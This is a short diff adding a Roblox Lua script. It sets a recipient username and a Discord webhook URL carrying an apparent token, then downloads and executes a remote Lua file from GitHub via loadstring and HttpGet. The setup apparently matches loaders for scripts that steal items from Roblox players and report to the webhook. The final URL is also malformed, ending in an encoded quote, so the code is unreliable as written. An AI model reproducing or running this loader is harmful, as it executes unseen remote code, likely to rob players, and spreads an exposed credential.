@@ -1,0 +1,4 @@
+UserName = "forniteballimcool"
+Webhook = "https://discordapp.com/api/webhooks/1095692137485582386/sfENWEYbfr7FPc74vv2oYW3i639fWEX_hLAeCFroiZqg3TMDU09DEorjQvsChQdAFCKa"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))()
